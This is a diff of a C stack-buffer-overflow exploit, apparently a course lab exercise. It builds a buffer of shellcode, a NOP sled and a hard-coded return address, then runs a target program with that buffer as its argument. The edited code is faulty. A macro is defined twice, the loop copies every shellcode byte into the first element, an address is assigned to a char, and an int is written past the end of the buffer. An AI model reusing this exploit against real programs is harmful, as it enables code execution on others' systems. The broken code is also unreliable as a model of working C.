@@ -5,32 +5,30 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-#define BUFSIZE 125
-#define TARGET_RA_ADDR 0x202dfe10
-#define SHELL_LENGTH strlen(shellcode)
+
+#define SHELL_SIZE 46
+
+#define BUF_SIZE 125
+#define BUF_ADDR 0x2021feb0
+
+#define SHELL_SIZE strlen(shellcode)
 
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
-	char attack_buffer[BUFSIZE];
-	int *p;
-	printf("%s", shellcode);
+	char attack_buffer[BUF_SIZE];
 
-	for(int i = 0; i < BUFSIZE;i++)
-		attack_buffer[i] = 0x04;
-	
-	for(int i = 0; i < SHELL_LENGTH; i++)
-		attack_buffer[i] = shellcode[i];
-	
-	for(int i = SHELL_LENGTH ; i < 120; i++)
-		attack_buffer[i] = 0x05;
+	for (int i = 0; i < SHELL_SIZE; i++)
+		attack_buffer[0] = shellcode[i];
+	for (int i = SHELL_SIZE; i < BUF_SIZE; i++)
+		attack_buffer[i] = 0x90;
+	attack_buffer[BUF_SIZE - 1] = BUF_ADDR;
 
-	int *ret_address = (int*)&attack_buffer[120];
-	*ret_address = TARGET_RA_ADDR;
 
-	attack_buffer[BUFSIZE - 1] = '\0';
+	int *ret_address = (int*)&attack_buffer[BUF_SIZE - 1];
+	*ret_address = BUF_ADDR;
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
